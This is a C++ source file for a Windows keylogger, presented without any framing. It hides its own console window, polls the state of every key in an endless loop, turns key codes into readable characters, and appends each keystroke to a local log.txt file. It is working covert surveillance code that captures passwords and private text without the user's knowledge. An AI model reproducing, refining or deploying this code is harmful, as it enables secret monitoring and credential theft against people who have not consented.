#include <iostream>
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <fstream>
#include <codecvt>
#include <stdlib.h>
#include <string>
void log(std::string c, std::string fileName);
std::string getKey(char c);

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::cout << "Process Started." << std::endl;
    unsigned char keyboardState[256] = {0};
    unsigned short buffer[2];
    HKL keyboardLayout = GetKeyboardLayout(0);
    while(true){
        Sleep(10);
        for(unsigned short k = 0; k < 256; k++)
            if(GetKeyState(k) & 0x8000) keyboardState[k] = 0x80;
            else keyboardState[k] = 0x00;
        for(unsigned short k = 0; k < 256; k++){
            int keyState = GetAsyncKeyState(k);
            if(keyState == -32767 && k != 16 && k != 160 && k != 17 && k != 162 && k != 18 && k != 164 && k != 161){
                std::string str;
                str = getKey(k);
                if(str == ""){
                    int ret = ToAsciiEx(k, MapVirtualKeyEx(k, 0, keyboardLayout), keyboardState, buffer, 0, keyboardLayout);
                    if(ret == 1) str = std::string("") + (char)buffer[0];
                    else if(ret == 2) str = "?";
                    else str = "[" + std::to_string((unsigned char)k) + "]";
                }
                std::cout << str;
                log(str, "log.txt");
            }
        }
    }
    return 0;
}
void log(std::string c, std::string fileName){
    std::fstream logFile;
    logFile.open(fileName, std::fstream::app | std::ios::binary);
    if(logFile.is_open()){
        logFile << c;
        logFile.close();
    }
}

std::string getKey(char c){
    switch(c){
    case VK_SPACE:
        return " ";
    case VK_RETURN:
        return "\n";
    case VK_BACK:
        return "[<-]";
    case VK_DELETE:
        return "[->]";
    case VK_LBUTTON:
        return "[L  ]";
    case VK_RBUTTON:
        return "[ M ]";
    case VK_MBUTTON:
        return "[  R]";
    case 91: //windows key
        return "[WIN]";
    case VK_ESCAPE:
        return "[ESC]";
    case VK_UP:
        return "[↑]";
    case VK_DOWN:
        return "[↓]";
    case VK_LEFT:
        return "[←]";
    case VK_RIGHT:
        return "[→]";
    }
    return "";
}
